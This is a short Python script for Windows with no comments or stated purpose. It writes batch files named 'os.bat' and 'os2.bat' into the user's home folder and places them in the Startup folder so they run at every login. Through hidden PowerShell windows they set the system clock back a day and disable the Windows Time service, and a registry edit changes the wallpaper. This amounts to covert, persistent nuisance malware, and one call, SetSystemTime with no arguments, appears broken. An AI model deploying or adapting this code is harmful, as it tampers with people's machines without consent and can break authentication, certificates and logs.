import ctypes as cty
import win32api
import os
import getpass
import shutil

USER_NAME = getpass.getuser()
home_dir = os.path.expanduser("~")
file_name = 'os.bat'
file_name2 = 'os2.bat'

def add_start():
    if not os.path.exists(home_dir + '/wp.jpg'):
        shutil.copy('Classes\\Media\\wp.jpg', home_dir)
    if not os.path.exists(home_dir + '/os.bat'):
        with open(os.path.join(home_dir, file_name), "w") as f:
            f.write('@echo off\npowershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Get-Date | ForEach-Object { $_.AddDays(-1) } | Set-Date"\npowershell -NoProfile -NonInteractive -WindowStyle Hidden -Command "Set-Service w32time -StartupType Disabled')    
    if not os.path.exists(home_dir + '/os2.bat'):
        with open(os.path.join(home_dir, file_name2), "w") as f:
            f.write('reg add "HKEY_CURRENT_USER\\control panel\\desktop" /v wallpaper /t REG_SZ /d  %userprofile%\\wp.jpg /f\nRUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters\nexit')

def add_to_startup(file_path,_name):
    if not os.path.exists(home_dir + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/' + _name):
        bat_path = r'C:/Users/%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup' % USER_NAME
        with open(bat_path + '//' + _name, "w+") as bat_file:
            bat_file.write(r'start "" "%s"' % file_path)

def change_Wallpaper():
    win32api.SetSystemTime()
    wp_path = './Media/wp.jpg'
    cty.windll.user32.SystemParametersInfoW(20, 0, wp_path, 3)

def run():
    add_start()
    add_to_startup(home_dir + '/os.bat',file_name)
    add_to_startup(home_dir + '/os2.bat',file_name2)